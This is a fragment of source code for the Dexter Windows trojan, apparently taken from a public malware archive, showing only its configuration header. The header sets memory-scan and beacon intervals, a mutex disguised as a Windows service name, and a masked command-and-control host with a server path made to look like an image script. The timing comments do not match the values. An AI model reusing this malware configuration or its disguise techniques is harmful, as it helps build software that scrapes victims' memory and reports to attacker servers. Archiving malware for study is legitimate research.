/*
  name      Dexter
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */

//BEGIN CONFIG///////////
#define Version "Machines"
#define MemoryScanInterval  (20*60000) //1min 
#define HttpConnectInterval (200*60000) //30min
#define MutexString "WindowsResilienceServiceMutex"
static char *Urls[]  = { "*********.com",0x00 };
static char *Pages[] = { "images/logo/header.php",0x00 }; 
//END CONFIG////////////
